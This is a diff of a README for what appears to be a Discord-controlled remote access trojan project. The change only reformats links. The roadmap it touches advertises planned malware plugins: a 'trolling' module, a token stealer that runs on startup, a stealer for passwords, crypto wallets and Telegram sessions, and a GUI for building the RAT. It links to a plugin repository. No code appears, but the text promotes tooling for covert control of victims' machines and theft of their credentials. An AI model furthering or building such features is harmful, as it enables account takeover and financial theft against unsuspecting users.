@@ -80,9 +80,9 @@
 
 - **Plugin System**  
   Add an plugin system to add not important features which would make an bigger .exe file. Also allow Community to share plugins easier. ☝🎀
-  - Trolling [Plugin](https://github.com/H-zz-H69/Discord-RAT-Plugins/)
-  - Stealer on Startup for like tokens and stuff [Plugin](https://github.com/H-zz-H69/Discord-RAT-Plugins/)
-  - Pass, crypto and telegram session Stealer [Plugin](https://github.com/H-zz-H69/Discord-RAT-Plugins/)
+  - Trolling [[Plugin]](https://github.com/H-zz-H69/Discord-RAT-Plugins/)
+  - Stealer on Startup for like tokens and stuff [[Plugin]](https://github.com/H-zz-H69/Discord-RAT-Plugins/)
+  - Pass, crypto and telegram session Stealer [[Plugin]](https://github.com/H-zz-H69/Discord-RAT-Plugins/)
 
 - **RAT Builder GUI**  
   GUI to build the RAT and add plugins and more. 🎁
